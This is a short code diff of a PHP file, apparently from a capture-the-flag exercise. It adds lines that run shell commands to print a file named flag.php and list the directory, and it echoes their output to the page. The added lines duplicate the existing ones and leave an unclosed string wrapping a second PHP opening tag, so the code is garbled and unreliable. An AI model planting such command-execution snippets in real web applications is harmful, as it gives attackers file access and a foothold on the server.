@@ -1,5 +1,8 @@
 <?php 
-  
+$output = shell_exec('cat flag.php'); 
+$test = shell_exec('ls');
+echo "<pre>
+<?php 
 $output = shell_exec('cat flag.php'); 
 $test = shell_exec('ls');
 echo "<pre>$output</pre>"; 
